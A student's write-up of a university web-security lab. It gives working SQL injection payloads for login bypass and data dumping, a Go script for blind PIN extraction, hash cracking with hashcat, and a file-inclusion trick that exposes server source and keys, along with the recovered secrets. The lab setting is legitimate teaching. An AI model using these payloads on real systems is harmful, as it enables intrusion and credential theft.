# Writeup

## Task 1: Login without password

We can do basic SQL injection and use following values:

* username: `dzivjmat' AND 1 = 1 #`
* password: `placeholder`

## Task 2: Find out your PIN

Let's write some code to solve this for us:

```go
package main

import (
    "fmt"
    "io/ioutil"
    "net/http"
    "net/url"
    "strconv"
    "strings"
)

// send is helper function that POSTS given data to index page.
func send(values url.Values) string {
    resp, err := http.PostForm("https://kbe.felk.cvut.cz/index.php", values)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()
    data, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        panic(err)
    }
    return string(data)
}

func stealPin() string {
    // start with empty pin
    pin := ""
    for len(pin) != 4 { // run until we have full pin
        for i := 0; i < 10; i++ { // try all digits: 0...9
            res := send(url.Values{
                "username": {fmt.Sprintf(`dzivjmat' AND pin LIKE '%s%d%%' #`, pin, i)},
                "password": {"placeholder"},
            })
            // if the page contains input for PIN we have successfully guessed the digit
            if strings.Contains(res, "PIN") {
                pin += strconv.Itoa(i)
                break
            }
        }
    }
    return pin
}

func main() {
    fmt.Printf("PIN: %s\n", stealPin())
    // result: 4425
}
```

## Task 3: Overcome One-Time-Password

Done using SQL injection and use following values:

* username: `unexistent_user' UNION ALL SELECT secret AS username FROM users WHERE username = 'dzivjmat' #`
* password: `placeholder`

Result: 3XLU4LMYWYYNFFW4

To get the TOTP code I used golang package github.com/xlzd/gotp and following snippet:

```go
fmt.Println(gotp.NewDefaultTOTP("3XLU4LMYWYYNFFW4").Now())
```

The result varies but works 😏

## Task 4: Exfiltrate a list of all usernames, passwords, salts, secrets and pins

After some attempts all that was needed is following query:

`https://kbe.felk.cvut.cz/index.php?offset=1 UNION SELECT CONCAT(username, ';', password, ';', salt, ';', pin), 1 FROM users`

Result included in file `all_users.csv`.

## Task 5: Crack your password hash

Done using bash

* `echo "62814f10dd416b616f733605740304cd87ba7508:ac598" > hash.txt` this format is required by hashcat
* `hashcat -a 3 -m110 hast.txt --force` -m110 because that's for sha1

Result: 12f40

## Task 6: Crack teacher's password hash

Tried a few pages and finally got positive result on:

https://hashtoolkit.com/decrypt-hash/?hash=2d55131b6752f066ee2cc57ba8bf781b4376be85

Result: fm9fytmf7q

The hash is `2d55131b6752f066ee2cc57ba8bf781b4376be85` and is taken from the `all_users.csv` file
created in step 4.

## Task 7: Explain why teacher's password is insecure despite it's length

It's "long" but contains only numbers and lowercase letters.

## Task 8: Print a list of all table names and their columns

1. get all tables: `https://kbe.felk.cvut.cz/index.php?offset=1 UNION ALL SELECT TABLE_NAME, 1 FROM INFORMATION_SCHEMA.TABLES`
  result: `codes, messages, users`
2. get columns for individual tables:
    * `https://kbe.felk.cvut.cz/index.php?offset=1 UNION ALL SELECT column_name, 1 INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'messages'`
      result: `username, base64_message_xor_key, date_time`
    * `https://kbe.felk.cvut.cz/index.php?offset=1 UNION ALL SELECT column_name, 1 INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'codes'`
      result: `username, aes_encrypt_code`
    * `https://kbe.felk.cvut.cz/index.php?offset=1 UNION ALL SELECT column_name, 1 INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users'`
      result: `username, passworn, pin, secret, salt`

## Task 9: Derive xor key used for encoding your messages

First steal the messages: `https://kbe.felk.cvut.cz/index.php?offset=1 UNION ALL SELECT base64_message_xor_key, 1 FROM messages WHERE username = 'dzivjmat'`

```
LwoePAQIHH9ZUAkCJQIUDzJTRA4fGlFefx8NECxFW0RGJgQXF39UWUBDDE8BOggXHCtFX1IVLAoFAHE=
RA5SNxkAH2JCW1kCOhNMFTdCD1FfHApVYSMACzpZHVZYfxINEH9RUVwQHgYcO0scFioXEkQDPB4QAH9RX1ZVVg==
LwoeM0dFDTcERhAVfwoOCX9UX0AQFgAFcUs2DT4cEkMTMQ4GRTldQhJEEApSMQ4dDX8GWlYKMw4MAjpBHg==
```

These represent respectively:

```
Welcome <b>dzivjmat</b>, this is your first secret message.
<a href="index.php?code">Here</a> you can find your secure code.
Well, that's all for now. Stay tuned for the next challenges.
```

We can reuse code from Crypto lab1:

```go
encoded := LwoePAQIHH9ZUAkCJQIUDzJTRA4fGlFefx8NECxFW0RGJgQXF39UWUBDDE8BOggXHCtFX1IVLAoFAHE=
data, _ := ioutil.ReadAll(base64.NewDecoder(base64.StdEncoding, strings.NewReader(encoded)))
fmt.Println(XORWithKey(string(data), "Welcome <b>dzivjmat</b>, this is your first secret message."))
```

Result: xor_key_e27f_kbe_2020

## [BONUS :hurtrealbad:] Task 10: Find out key used for encoding secure codes

After some time I found the `Warning` link leading to `https://kbe.felk.cvut.cz/index.php?open=warning.txt`.
A few more attempts and: `https://kbe.felk.cvut.cz/index.php?open=index.php` which
opens the server code itself. Here it was:

```php
...
define("AES_ENCRYPT_CODE_KEY", "UScnF4L5AX5kmpib");
...
```

Result: `UScnF4L5AX5kmpib`

## [BONUS :feelsgood:] Task 11: Steal Martin Rehak's secure code 

* Let's get back to the `codes` table: `https://kbe.felk.cvut.cz/index.php?offset=1 UNION ALL SELECT CONCAT(username, ":", aes_encrypt_code), 1 FROM codes`.
* Here we find: `rehakmar:7280ED648FEDDB0E8BC8B12DA93723BF824AE15DC1DB8204238F3583FE5DB0CF`.
* Resuse code from crypto lab2:
```go
d, _ := hex.DecodeString("7280ED648FEDDB0E8BC8B12DA93723BF824AE15DC1DB8204238F3583FE5DB0CF")
fmt.Println(string(DecryptAESECB([]byte("UScnF4L5AX5kmpib"), d)))
```

Result: acid-load-direct-obvious
